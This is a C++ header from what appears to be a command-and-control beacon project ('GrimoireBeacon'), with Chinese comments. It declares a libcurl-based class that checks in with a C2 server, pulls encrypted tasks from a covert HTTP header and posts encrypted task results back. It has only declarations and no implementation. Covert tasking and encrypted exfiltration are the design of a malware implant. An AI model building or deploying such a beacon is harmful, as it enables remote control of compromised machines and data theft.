//
// Created by Nebu1ea on 2025/11/25.
//

#ifndef GRIMOIREBEACON_GRIMOIRECOMMS_HPP
#define GRIMOIREBEACON_GRIMOIRECOMMS_HPP


#include <string>
#include <memory>
#include "GrimoireCrypto.hpp"

// 引入 libcurl 库所需的头文件
#include <curl/curl.h>

namespace Grimoire::Comms {

    class GrimoireComms {
    public:
        /**
         * @brief 构造函数：初始化 libcurl，并依赖一个 GrimoireCrypto 实例。
         * @param crypto_manager 共享的加密模块实例。
         * explicit杜绝隐式转换
         */
        explicit GrimoireComms(std::shared_ptr<Crypto::GrimoireCrypto> crypto_manager);
        ~GrimoireComms();

        /**
         * @brief 首次签入：执行密钥协商。
         * @param server_public_key_b64 服务器的永久公钥（Base64）。
         * @return 成功返回 true，失败返回 false。
         */
        bool SendInitialCheckIn();

        /**
         * @brief 发送任务结果：执行 POST 请求，将加密数据发送给服务器。
         * @param plaintext_to_send 待发送的原始任务结果。
         * @return 成功返回 true，失败返回 false。
         */
        bool SendResult(const std::vector<unsigned char>& plaintext_to_send);

        /**
         * @brief 接收任务：执行 GET 请求，从 HTTP Header (X-Data-Ref) 中接收加密任务。
         * @return 解密后的原始任务数据（例如 JSON 字符串的字节数组）。
         */
        std::vector<unsigned char> ReceiveTask();

    private:
        // 共享的加密模块，用于对所有数据进行加解密
        std::shared_ptr<Crypto::GrimoireCrypto> crypto_manager_;

        // libcurl 句柄，用于会话复用和配置设置
        CURL* curl_handle_;

        // 存储 Beacon 将要通信的完整 URL
        std::string c2_url_;

        // libcurl 的回调函数，用于接收服务器数据
        static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp);

        // libcurl 的回调函数，用于接收服务器的头
        static size_t HeaderCallback(char* buffer, size_t size, size_t nitems, void* userp);

        //用于存储服务器发送的 X-Data-Ref header 值
        std::string incoming_task_header_;
        // 初始化 curl 句柄
        void InitializeCurlHandle();
    };

} // namespace Grimoire::Comms


#endif //GRIMOIREBEACON_GRIMOIRECOMMS_HPP